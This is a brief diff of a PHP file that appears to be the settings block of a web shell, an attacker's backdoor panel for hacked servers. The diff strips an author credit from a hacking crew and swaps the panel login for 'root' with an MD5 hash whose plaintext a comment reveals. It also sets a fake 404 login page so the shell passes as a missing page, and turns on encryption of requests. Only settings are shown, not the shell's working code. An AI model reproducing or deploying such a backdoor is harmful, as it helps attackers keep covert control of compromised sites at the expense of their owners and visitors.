@@ -1,17 +1,11 @@
 <?php
-/*
-	Author: 	caspet ft expat crew
-	YouTube: 	https://www.youtube.com/@casperisback
-	Gmail:		trustmeitscasper@gmail.com
-	Date:		Merry Christmas from us !
-*/
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'wordpress',
-    'password' => '$2y$10$ZqolOSVQhCMC0z17goDZrevgyeQv14e4csJeQWU.0Y1Xo8p39tJr6',
-    'safe_mode' => '0',
-    'login_page' => '403',
+    'username' => 'root',
+    'password' => 'c24df88d249b151dae2b7c40de81e775',//md5(ehsan)
+    'safe_mode' => '1',
+    'login_page' => '404',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => true,
     'cgi_api' => true,
 );
 
